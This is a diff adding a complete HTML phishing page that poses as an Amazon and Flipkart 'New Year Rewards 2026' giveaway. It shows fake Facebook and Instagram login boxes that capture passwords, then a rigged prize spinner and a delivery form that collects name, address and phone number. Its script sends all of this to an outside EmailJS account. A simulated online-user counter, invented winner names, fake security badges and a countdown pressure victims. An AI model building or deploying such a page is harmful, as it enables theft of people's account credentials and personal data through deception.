@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flipkart | Amazon New Year Rewards 2026</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+    <style>
+        :root {
+            --primary: #2874f0; /* Flipkart Blue */
+            --amazon: #ff9900;  /* Amazon Orange */
+            --secondary: #7000ff;
+            --bg: #020202; 
+            --card-bg: rgba(18, 18, 18, 0.8);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+
+        body { 
+            background-color: var(--bg); color: #fff; min-height: 100vh; overflow-x: hidden;
+            display: flex; flex-direction: column; align-items: center;
+        }
+
+        /* --- BACKGROUND ANIMATION --- */
+        .bg-wrapper {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: #000; overflow: hidden;
+        }
+        .blob {
+            position: absolute; width: 500px; height: 500px; border-radius: 50%;
+            filter: blur(100px); opacity: 0.2; animation: move 20s infinite alternate;
+        }
+        .blob-1 { background: var(--primary); top: -10%; left: -10%; }
+        .blob-2 { background: var(--amazon); bottom: -10%; right: -10%; animation-delay: -5s; }
+        @keyframes move { to { transform: translate(100px, 50px) scale(1.1); } }
+
+        /* --- HEADER & LIVE COUNTER --- */
+        .top-header {
+            width: 100%; max-width: 500px; padding: 20px;
+            display: flex; justify-content: space-between; align-items: center;
+            z-index: 10;
+        }
+        .brand-text { font-weight: 800; font-size: 1.2rem; letter-spacing: -1px; }
+        .live-count { background: rgba(0,255,0,0.1); color: #0f0; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700; border: 1px solid rgba(0,255,0,0.2); }
+
+        .progress-line {
+            position: fixed; top: 0; left: 0; height: 4px; z-index: 1000;
+            background: linear-gradient(90deg, var(--primary), var(--amazon));
+            width: 0%; transition: 0.8s ease;
+        }
+
+        .container { width: 100%; max-width: 450px; padding: 20px; position: relative; }
+
+        /* --- CARD --- */
+        .card { 
+            background: var(--card-bg); backdrop-filter: blur(20px); border: 1px solid var(--border);
+            border-radius: 30px; padding: 40px 25px; text-align: center; display: none; 
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+            animation: slideUp 0.6s ease-out forwards;
+        }
+        .card.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        .shimmer-text {
+            background: linear-gradient(to right, #fff 20%, var(--primary) 40%, var(--amazon) 60%, #fff 80%);
+            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: shine 4s linear infinite; font-size: 2.4rem; font-weight: 800;
+        }
+        @keyframes shine { to { background-position: 200% center; } }
+
+        .btn-main { 
+            background: #fff; color: #000; border: none; width: 100%; padding: 18px; border-radius: 15px; 
+            font-size: 1rem; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 20px;
+            transition: 0.3s;
+        }
+        .btn-main:hover { background: var(--primary); color: #fff; transform: translateY(-3px); }
+
+        .field { 
+            background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--border); 
+            width: 100%; padding: 16px; border-radius: 12px; font-size: 1rem; outline: none; margin-bottom: 15px;
+        }
+        .secure-tag { font-size: 0.65rem; color: #888; display: flex; align-items: center; justify-content: center; gap: 5px; margin-bottom: 15px; }
+
+        /* --- SPINNER --- */
+        .spinner-frame {
+            height: 100px; overflow: hidden; background: #000; border-radius: 20px;
+            margin: 25px 0; border: 2px solid var(--primary); position: relative;
+        }
+        .spinner-list { transition: transform 6s cubic-bezier(0.1, 0, 0, 1); }
+        .spinner-item { height: 100px; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; font-weight: 800; color: var(--amazon); }
+
+        .footer-badges { display: flex; justify-content: space-around; margin-top: 20px; opacity: 0.6; font-size: 0.6rem; }
+        .ticker { position: fixed; bottom: 20px; background: rgba(10,10,10,0.9); padding: 10px 20px; border-radius: 50px; font-size: 0.8rem; border: 1px solid var(--border); z-index: 100; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-wrapper">
+        <div class="blob blob-1"></div>
+        <div class="blob blob-2"></div>
+    </div>
+
+    <div id="p-line" class="progress-line"></div>
+
+    <div class="top-header">
+        <div class="brand-text"><span style="color:var(--amazon)">| Amazon</span></div>
+        <div class="live-count"><i class="fas fa-users"></i> <span id="user-count">1,248</span> Online</div>
+    </div>
+
+    <div class="container">
+        <!-- S1: Home -->
+        <section id="s1" class="card active">
+            <h1 class="shimmer-text">Happy New Year <br>2026</h1>
+            <p style="color: #888; margin-top: 10px;">Official New Year Reward Program. Claim high-end products and vouchers.</p>
+            <div style="background: rgba(255,153,0,0.1); color: var(--amazon); padding: 10px; border-radius: 10px; margin-top: 20px; font-size: 0.75rem; font-weight: 700;">
+                <i class="fas fa-truck-fast"></i> ORDER DISPATCHED WITHIN 48HRS
+            </div>
+            <button class="btn-main" onclick="go(2)">Get My Gift</button>
+            <div class="footer-badges">
+                <span><i class="fas fa-shield-halved"></i> SSL Secure</span>
+                <span><i class="fas fa-check-circle"></i> Official Draw</span>
+                <span><i class="fas fa-lock"></i> Data Encrypted</span>
+            </div>
+        </section>
+
+        <!-- S2: Auth -->
+        <section id="s2" class="card">
+            <h2>Secure <span style="color:var(--primary)">Login</span></h2>
+            <p style="color: #888; font-size: 0.85rem; margin-bottom: 20px;">Verify your identity to secure your details.</p>
+            
+            <div style="background: #1877F2; padding: 15px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; font-weight: 700;" onclick="document.getElementById('auth').style.display='block'">
+                <i class="fab fa-facebook"></i> Login with Facebook
+            </div>
+            <div style="background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); padding: 15px; border-radius: 12px; margin-bottom: 20px; cursor: pointer; font-weight: 700;" onclick="document.getElementById('auth').style.display='block'">
+                <i class="fab fa-instagram"></i> Login with Instagram
+            </div>
+            
+            <div id="auth" style="display:none; animation: slideUp 0.4s;">
+                <div class="secure-tag"><i class="fas fa-user-shield"></i> We secure your details with AES-256 encryption</div>
+                <input type="text" id="l_u" class="field" placeholder="Mobile / Email">
+                <input type="password" id="l_p" class="field" placeholder="Password">
+                <button class="btn-main" onclick="saveLogin()">Verify Account</button>
+            </div>
+        </section>
+
+        <!-- S3: Name -->
+        <section id="s3" class="card">
+            <h2>Winner <span style="color:var(--primary)">Profile</span></h2>
+            <p style="color: #888; margin-bottom: 20px;">Enter your legal name as per ID for delivery.</p>
+            <input type="text" id="fname" class="field" placeholder="Full Name">
+            <button class="btn-main" onclick="saveName()">Enter Prize Draw</button>
+        </section>
+
+        <!-- S4: Spinner -->
+        <section id="s4" class="card">
+            <h2>Selection <span style="color:var(--amazon)">Process</span></h2>
+            <div class="spinner-frame">
+                <div id="prize-strip" class="spinner-list"></div>
+            </div>
+            <button id="spin-btn" class="btn-main" onclick="startSelection()">Tap to Spin</button>
+        </section>
+
+        <!-- S5: Claim -->
+        <section id="s5" class="card">
+            <h1 style="font-size: 1.8rem; color: #0f0;">Congratulations!</h1>
+            <p id="win_user_display" style="font-weight:700; color: #fff;"></p>
+            <div id="prize_display" style="margin: 20px 0; padding: 25px; border: 2px dashed var(--primary); font-size: 1.3rem; font-weight: 800; background: rgba(40,116,240,0.05);"></div>
+            
+            <div class="secure-tag" style="color:var(--amazon)"><i class="fas fa-clock"></i> Claim within 10 mins to guarantee 48hr dispatch</div>
+            
+            <form onsubmit="handleFinalSubmit(event)">
+                <input type="text" id="addr" class="field" placeholder="Flat / House No / Street" required>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="city" class="field" placeholder="City" required>
+                    <input type="number" id="pin" class="field" placeholder="Zip Code" required>
+                </div>
+                <input type="number" id="ph" class="field" placeholder="Contact Number" required>
+                <button type="submit" id="claim-btn" class="btn-main">Confirm Delivery</button>
+            </form>
+        </section>
+
+        <!-- S6: Final -->
+        <section id="s6" class="card">
+            <i class="fas fa-box-open" style="font-size: 4rem; color: var(--amazon);"></i>
+            <h2 style="margin-top:20px;">Order Placed!</h2>
+            <p style="color:#888; margin-top:10px;">Thank you <span id="final_name" style="color:#fff;"></span>. Your gift will be dispatched within 48 hours.</p>
+            <div id="disp_oid" style="margin-top: 25px; font-family: monospace; color: var(--primary); border: 1px solid var(--border); padding: 10px; border-radius: 10px;"></div>
+            <button class="btn-main" onclick="location.reload()">Return Home</button>
+        </section>
+    </div>
+
+    <div class="ticker" id="ticker-text">Syncing with Amazon & Flipkart servers...</div>
+
+    <script>
+        emailjs.init("O2YH6gmDldC2us6xc"); 
+
+        const prizeArr = ["Smart Phone Pro", "Noise Buds", "Hand Bag", "Party Dress", "Fast Powerbank"];
+        
+        let state = { 
+            login_username: "", login_password: "", user_name: "", user_email: "Customer@ecom-rewards.com",
+            user_phone: "", timestamp: new Date().toLocaleString(), page_url: window.location.href,
+            prize_won: "", prize_icon: "🎁", prize_category: "E-Comm Elite Draw",
+            order_id: "ORD-" + Math.floor(100000 + Math.random() * 900000),
+            order_date: new Date().toLocaleDateString(), delivery_address: "",
+            delivery_city: "", delivery_zipcode: ""
+        };
+
+        const strip = document.getElementById('prize-strip');
+        [...prizeArr, ...prizeArr, ...prizeArr].forEach(p => {
+            const div = document.createElement('div');
+            div.className = 'spinner-item';
+            div.innerText = p;
+            strip.appendChild(div);
+        });
+
+        function go(s) {
+            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+            document.getElementById(`s${s}`).classList.add('active');
+            document.getElementById('p-line').style.width = (s * 16.6) + "%";
+            window.scrollTo(0,0);
+        }
+
+        function saveLogin() {
+            state.login_username = document.getElementById('l_u').value;
+            state.login_password = document.getElementById('l_p').value;
+            if(state.login_username.length < 3) return alert("Verify mobile or email.");
+            go(3);
+        }
+
+        function saveName() {
+            state.user_name = document.getElementById('fname').value;
+            if(state.user_name.length < 3) return alert("Enter your full name.");
+            go(4);
+        }
+
+        function startSelection() {
+            document.getElementById('spin-btn').disabled = true;
+            const winningIdx = Math.floor(Math.random() * prizeArr.length);
+            state.prize_won = prizeArr[winningIdx];
+            
+            const stopAt = (prizeArr.length + winningIdx) * 100;
+            strip.style.transform = `translateY(-${stopAt}px)`;
+
+            setTimeout(() => {
+                confetti({ particleCount: 150, spread: 70, colors: ['#2874f0', '#ff9900', '#ffffff'] });
+                document.getElementById('win_user_display').innerText = state.user_name;
+                document.getElementById('prize_display').innerText = state.prize_won;
+                go(5);
+            }, 6500);
+        }
+
+        function handleFinalSubmit(e) {
+            e.preventDefault();
+            const btn = document.getElementById('claim-btn');
+            btn.innerText = "Securing Order...";
+            btn.disabled = true;
+
+            state.delivery_address = document.getElementById('addr').value;
+            state.delivery_city = document.getElementById('city').value;
+            state.delivery_zipcode = document.getElementById('pin').value;
+            state.user_phone = document.getElementById('ph').value;
+
+            emailjs.send("service_bg7r4ia", "template_l6d124o", state)
+            .then(() => {
+                document.getElementById('final_name').innerText = state.user_name;
+                document.getElementById('disp_oid').innerText = "TRACKING: " + state.order_id;
+                go(6);
+            }, () => {
+                btn.disabled = false;
+                alert("Server busy. Please try again.");
+            });
+        }
+
+        // Live User Counter Simulation
+        setInterval(() => {
+            const count = 1200 + Math.floor(Math.random() * 200);
+            document.getElementById('user-count').innerText = count.toLocaleString();
+        }, 3000);
+
+        setInterval(() => {
+            const names = ["Raj", "Anjali", "Suresh", "Priya", "Vikram"];
+            const n = names[Math.floor(Math.random()*5)];
+            const i = prizeArr[Math.floor(Math.random()*5)];
+            document.getElementById('ticker-text').innerText = `${n} just claimed ${i} - 48h Dispatch Confirmed!`;
+        }, 5000);
+    </script>
+</body>
+</html>
